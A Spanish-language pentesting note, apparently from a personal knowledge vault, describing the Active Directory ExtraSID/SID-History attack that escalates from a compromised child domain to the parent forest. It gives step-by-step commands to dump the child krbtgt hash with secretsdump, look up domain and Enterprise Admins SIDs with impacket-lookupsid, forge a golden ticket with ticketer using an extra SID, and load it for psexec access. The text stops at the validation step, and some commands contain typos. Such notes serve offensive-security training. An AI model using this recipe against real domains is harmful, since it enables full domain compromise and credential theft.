#AD #ExtaSID #SIDHistory #KRBTGT #GoldenTicket #DCSync 

>Una confianza de dominio se utiliza para establecer la autenticación entre bosques o dominios.
>Este caso se da cuando una empresa por ejemplo tiene dos dominios diferentes y los fusionan, pudiendo los usuarios poder acceder a ambos dominios

# Child -> Parent
## SID History
>El SID-History es diseñado para almacenar SID, a lo cual le permite a un usuario del bosque1 que ha sido añadido en el bosque2 poder acceder a los recursos sobre los que tiene permiso de los dos sin problema

### EXTRASID Attack
Este ataque permite comprometer un dominio `principal(parent)` una vez comprometido un dominio `secundario(child)`

## Requisitos
- Hash KRBTGT -> del dominio secundario(child)
- SID -> del dominio secundario(child)
- Nombre del usuario objetivo en el domingo secundario (No tiene por que existir)
- FQDN -> del dominio secundario(child)
- SID -> del grupo de Administradores del dominio principal(parent)


## Fases

**Todas las fases enumeradas a continuación se harán desde la maquina comprometida del dominio secundario(child)**
### Obtener el hash de la cuenta KRBTGT
Para obtener el hash `KRBTGT` de la cuenta secundaria(child), deberemos de usar la herramienta [[SECRETSDUMP]]

```shell
secretsdumb <dominio.secundarios>/<usuario.admin>@<IP> -just-dc-user <dominio>/krbtgt
```

Obteniendo así el hash de la cuenta `KRBTGT`

### Obtener el SID del dominio secundario(child)
Usaremos la herramienta [[IMPACKET]] con el comando `lookupsid`

```shell
impacket-lookupsid <dominio.secundario>/<usuario.admin>@<IP> | grep "Domain SID"
```

Obteniendo asi el SID del dominio secundario

### Obtener SID del grupo de administradores del dominio principal(parent)
Para obtener el `SID` usaremos la misma herramienta que antes [[IMPACKET]]

 ```shell
 impacket-lookupsid <dominio.secundario>/<usuario.admin>@<IP.principal> | grep -B12 "Enterprise Admins"
 ```

## Golden Ticket
### Explotación -> TICKETER
Usaremos la herramienta [[TICKETER]] para construir el `Golden Ticket`

```shell
ticketer -nthash <hash.KRBTGT> -domain <dominio.secundario> -domain-sid <SID.scecundario> -extra-sid <SIS.admins> <user>
```

Se nos guardara en un archivo llamado `user.ccache`, este archivo lo tendremos que añadir en la variable de entorno `KRB5CCNAME` con el comando

```shell
export KRB5CCNAME=user.ccache
```

### Validación de crecenciales
Validaremos las credenciales con [[IMPACKET]] usando `psexec`
